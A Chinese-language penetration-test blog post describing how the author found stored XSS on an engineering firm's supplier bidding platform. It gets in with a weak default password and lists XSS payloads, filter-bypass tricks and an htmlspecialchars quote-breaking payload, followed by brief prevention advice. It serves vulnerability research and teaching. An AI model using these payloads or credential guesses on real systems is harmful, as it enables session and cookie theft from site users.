免责声明:
=====

渗透过程为授权测试,所有漏洞均以提交相关平台,博客目的只为分享挖掘思路和知识传播\*\*
--------------------------------------------

涉及知识:
=====

xss注入及xss注入绕过

挖掘过程:
=====

背景:  
某次针对某目标信息搜集无意发现某工程公司的项目招标平台

厚码…求生欲满满呜呜呜[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7dd67ccd2ba5db99cfca2a79d5e16618d16f3944.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-7dd67ccd2ba5db99cfca2a79d5e16618d16f3944.png)

有个供应商登陆,啥也不说先来个弱口令 123456:123456

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1c7f14a81c50dc345387c41d46700cbf24c4dc62.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1c7f14a81c50dc345387c41d46700cbf24c4dc62.png)  
只能说弱口令yyds!!!!  
发现在供应商资料中存在不少输入点,手痒随手一波xss

分享一波常用测试语句:

输入框:

```javascript
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert("XSS")</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

```

图片:

```javascript
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x οnerrοr=alert("XSS");>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

编辑器:

```javascript
[a](javascript:window.onerror=alert;throw%201)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](j a v a s c r i p t:prompt(document.cookie))
[a](javascript:prompt(document.cookie))
```

刷一波发现大部分都有过滤,但是\[股份/责任人\] 栏下有代码被注入成功

语句为:`"<script>alert('XSS')</script>"<`\\  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ecba057b541659fe9f9bdf2ff105a305ea56b48f.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ecba057b541659fe9f9bdf2ff105a305ea56b48f.png)  
查看该部分DOM源码:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a31e9c00b80c865867b8ce09ae33c84c82797cb8.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-a31e9c00b80c865867b8ce09ae33c84c82797cb8.png)

有戏!

针对该点继续测试,构造语句:`"<script>alert('XSS')</script>"<`  
![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-49841cdf218123c53f5ac01e2feff05cba449662.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-6c95598970700fd316877d4ee2172d0e476922a2.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-6c95598970700fd316877d4ee2172d0e476922a2.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-38a9cb8a45203cab91317735e2454db7f847fc08.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-38a9cb8a45203cab91317735e2454db7f847fc08.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d4552925c66fbbe1bc3a6b06379e5bd6539f0ac8.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d4552925c66fbbe1bc3a6b06379e5bd6539f0ac8.png)

尝试url编码:  
"&lt;script&gt;alert("''XSS'")%3C/script%3E  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1aa01c8cf4fd7cfa2f5501fcb0b573125acee0d6.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1aa01c8cf4fd7cfa2f5501fcb0b573125acee0d6.png)

这么一通注下来,对刚刚的乱注小总结一下:

- 发现 / 被转义成 =”” //
- /变成 =””
- &lt;/ script&gt;转义成&lt;="" script=""&gt; 而且多个/
- 如///也只被转义成 ="" 没办法重写绕过

- - - - - -

并且存在htmlspecialchars()函数: &amp;quot,意味: """  
本地测试发现script便签中存在 &amp;quot 就无法弹窗

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-adb8d1c60f0262010bf7641e02d019a9180c58d9.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-adb8d1c60f0262010bf7641e02d019a9180c58d9.png)

所以存在两个问题,一方面要绕过这个&amp;quot,而且要绕过&lt;/script&gt;的转义

先说对&lt;/script&gt;的绕过思路:  
转换法:

```php
前端限制绕过，直接抓包重放，或者修改html前端代码
大小写，比如：<scrIPT>alERT(1111)</scRIPT>用来绕过
拼凑：<scri<script>pt>alert(1111)</scri</script>pt>
使用注释干扰：
<scri<!--test-->pt>alert(111)</scri<!--test-->pt>
编码法:核心思路：后台过滤了特殊字符，比如<script>标签，但该标签可以被各种编码，后台不一定过滤，当浏览器对该编码进行识别时，会翻译成正常的便签，从而执行在使用编码时需要主要编码在输出点是否会被正常是不和翻译！
```

接下来说对&amp;quot的绕过:  
`htmlspecialchars()函数是把预定义的字符转换为HTML实体，预定义的字符是：

&amp;（和号）成为 &amp;amp  
" (双引号）成为&amp;quot  
‘（单引号）成为&amp;#039  
&lt;(小于号）成为&amp;lt

> (大于号） 成为&amp;gt  
> 可引用类型:  
> ENT\_COMPAT-默认，仅编码双引号  
> ENT\_QUOMES-编码双引号和单引号  
> ENT\_NOQUOTES-不编码任何引号  
> `

其他函数  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2485164d31360b05ed035f97489c2972054bd734.watermark%2Ctype_zmfuz3pozw5nagvpdgk%2Cshadow_10%2Ctext_ahr0chm6ly9ibg9nlmnzzg4ubmv0l3dlaxhpbl80nty3odezma%3D%3D%2Csize_16%2Ccolor_ffffff%2Ct_70)

构造语句:

构造对&amp;quot的绕过:

`q'οnclick='alert(1111)'`

直接产生弹窗:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3e8cabb245933cdbe5def83a716883ad0920eec4.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3e8cabb245933cdbe5def83a716883ad0920eec4.png)  
重新访问页面该xss弹窗还在,说明注入成功

接下来就是利用xss平台对这个注入点进行下一步利用  
具体可以参考:  
<https://www.cnblogs.com/coderge/p/13701664.html>

xss常见的防范措施

总的原则：输入做过滤，输出做转义  
过滤：根据业务需求进行过滤，比如过滤要求输入手机号，则只允许输入手机号格式的数字  
转义：所有输入到前端的数据都根据输出点进行转义，比如输出到HTML中进行HTML实体转义，输入到JS里面的进行JS转义